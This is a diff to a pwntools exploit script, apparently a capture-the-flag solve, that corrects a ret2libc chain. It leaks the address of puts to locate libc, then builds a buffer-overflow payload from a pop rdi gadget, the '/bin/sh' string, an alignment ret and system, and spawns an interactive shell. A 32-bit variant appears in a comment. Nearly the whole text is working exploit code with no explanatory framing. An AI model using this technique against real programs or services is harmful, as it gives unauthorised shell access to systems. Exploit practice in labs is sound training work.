@@ -91,11 +91,13 @@ leak = u64(p.recvline().strip().ljust(8, b'\x00'))
 libc.address = leak - libc.sym['puts']
 
 # --- Stage 2: ret2libc ---
-ret    = ROP(elf).find_gadget(['ret'])[0]       # stack alignment
-system = libc.sym['system']
-binsh  = next(libc.search(b'/bin/sh'))
-payload2 = b'A' * offset + p64(ret) + p64(binsh) + p64(system)
-# (adjust ROP chain to match binary ABI)
+# x86-64 SysV: system's first arg goes in rdi, so pop it off the stack first.
+pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
+ret     = ROP(elf).find_gadget(['ret'])[0]      # extra ret for movaps stack alignment
+system  = libc.sym['system']
+binsh   = next(libc.search(b'/bin/sh'))
+payload2 = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
+# (32-bit cdecl instead: b'A'*offset + p32(system) + p32(ret) + p32(binsh))
 p.sendlineafter(b'> ', payload2)
 
 p.interactive()
